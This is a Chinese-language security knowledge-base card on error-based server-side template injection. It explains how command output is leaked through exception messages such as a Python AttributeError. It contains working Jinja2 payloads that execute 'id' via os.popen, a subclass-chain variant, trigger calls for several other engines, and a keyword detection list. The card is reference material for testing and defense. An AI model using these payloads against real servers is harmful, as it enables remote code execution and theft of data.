---
id: web-generic-ssti-error-message-exfiltration
title: SSTI 报错回显外带：把命令输出作为非法参数由异常消息吐出
type: scenario
domain: web
path: web/generic/ssti
technique: ssti-error-based-exfiltration
tags:
- ssti
- error-based
- exfiltration
- jinja2
- freemarker
- twig
- smarty
- php
- python
- java
- ruby
- nodejs
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V77
  verified_at: '2026-11-05T16:31:00+08:00'
  notes: 已对照原文与图01-03核对：getattr 报错回显命令输出（AttributeError 携带 ipconfig/passwd 内容）成立；多语言触发点与原文一致；卡内子类索引写法已注明随环境变化；未独立复跑
url: /docs/web/generic/ssti/web-generic-ssti-error-message-exfiltration/
draft: false
kb_aliases:
- SSTI 报错注入
- SSTI 错误回显
- Error-based SSTI
- SSTI error message exfiltration
- getattr 报错外带
- Successful Errors
---

## 一句话结论

当 SSTI 的结果被业务逻辑吞掉、但异常消息仍返回给客户端时，把执行结果当作 `getattr()`、`call_user_func()`、`require()` 等必错调用的参数，解释器会把该字符串写进异常文本，从而在不回显、不出网的前提下带出命令输出与文件内容。

## 原理

解释器为了便于调试，在参数类型或取值非法时会把实参内容拼进异常消息：

- CPython 的 `getattr(obj, name)` 在属性不存在时抛出 `AttributeError: 'str' object has no attribute '<name>'`，其中 `<name>` 就是攻击者传入的结果字符串；
- PHP 调用不存在的回调时，warning/Error 会带上被当作 callable 的名字；
- FreeMarker 的 `${OUTPUT?new()}` 按类名实例化失败时把类名写进异常；
- Ruby 的 `File.read(OUTPUT)` 抛 `Errno::ENOENT` 并回显路径；
- Node.js 的 `require(OUTPUT)` 抛 `Cannot find module '<name>'`。

因此只要模板表达式能执行并产生字符串，再让该字符串成为一个“必然失败”的原生调用的参数，错误页就成为单向回显通道。它不依赖目标出网（不同于 OAST/DNSLog），也不依赖正常响应体显示表达式结果，只依赖错误详情对客户端可见。错误页通常出现在 DEBUG 模式、框架默认错误页或把异常信息写回响应的接口中。

## 触发条件

- 存在 SSTI，且能执行到“产生字符串”的环节（命令执行、文件读取、配置读取等）；
- 错误详情返回客户端（调试模式、Verbose 错误页、异常回显接口等）；
- 输出字符串可作为参数值进入必错调用；长度受限、换行与引号可能破坏语法，需要分片；
- 若引擎沙箱禁用 dunder 与内置函数，需先绕过属性/内置访问限制。

## 利用步骤

1. 探测错误可见性：发送 `{{ 1/0 }}` 或调用不存在的方法，观察响应是否包含异常类名、堆栈或可识别错误文本。
2. 取得字符串产生原语，例如 Jinja2 中 `cycler.__init__.__globals__.os.popen("id").read()`，先不要直接渲染。
3. 用 `getattr` 等必错调用包裹结果；模板上下文没有内置 `getattr` 时，从 `__globals__.__builtins__` 取。
4. 从错误消息中提取内容；错误页会截断长文本时用切片分段，如 `[0:80]`、`[80:160]`。
5. 多行内容或含换行导致截断时，按行或按字符区间多次请求拼接。

## PoC

```jinja2
# 最小验证：错误消息回显可控字符串
{{ cycler.__init__.__globals__.__builtins__.getattr("", "hello") }}

# 让命令输出进入 AttributeError（Jinja2 默认全局 cycler）
{{ cycler.__init__.__globals__.__builtins__.getattr("", cycler.__init__.__globals__.os.popen("id").read()) }}
```

返回 500，异常文本形如：

```text
AttributeError: 'str' object has no attribute 'uid=33(www-data) gid=33(www-data) ...'
```

子类链形式的等价写法（`__subclasses__()` 索引随环境变化，且 `getattr` 通常在 `__builtins__` 中而不是模块 globals 的直接键）：

```jinja2
{{ "".__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['getattr']("", <OUTPUT>) }}
```

多语言触发点（语法需按引擎适配）：

```text
Python/Jinja2   : getattr("", OUTPUT)      -> AttributeError 回显 OUTPUT
PHP/Twig/Smarty : call_user_func(OUTPUT)   -> callable 名无效，回显 OUTPUT
Java/FreeMarker : ${OUTPUT?new()}          -> 类不存在，回显 OUTPUT
Ruby/ERB        : File.read(OUTPUT)        -> 文件不存在，回显 OUTPUT
NodeJS/EJS      : require(OUTPUT)          -> 模块不存在，回显 OUTPUT
```

## 变体与关联

- 变体：错误消息被统一替换，但 200/500 或错误页可区分时，改用布尔报错盲注 [[web-python-ssti-jinja2-boolean-error-blind]]。
- 变体：错误详情完全不可见且状态码一致时，退回时间盲注或出网外带。
- 关联：[[web-python-ssti-jinja2-flask-globals-rce]]、[[web-python-ssti-jinja2-subclasses-index-rce]]、[[web-generic-ssti-engine-identification-decision-tree-errors]]。

## 检测与防御

- 检测：模板参数中出现 `getattr`、`__globals__`、`__builtins__`、`__subclasses__`、`popen`、`call_user_func`、`?new(`、`require(` 等组合；同一会话连续触发 500 且响应含异常类名或堆栈；错误文本中出现命令输出/系统文件内容特征。
- 防御：用户输入永不作为模板源码；生产环境关闭 DEBUG，统一错误页且不回显堆栈与异常参数；模板引擎使用沙箱并移除 `__class__`、`__globals__`、`__builtins__` 等访问；WAF 拦截模板表达式与危险函数名。
- 注意：隐藏错误页只能挡住“错误消息回显”，挡不住“是否报错”的布尔侧信道。
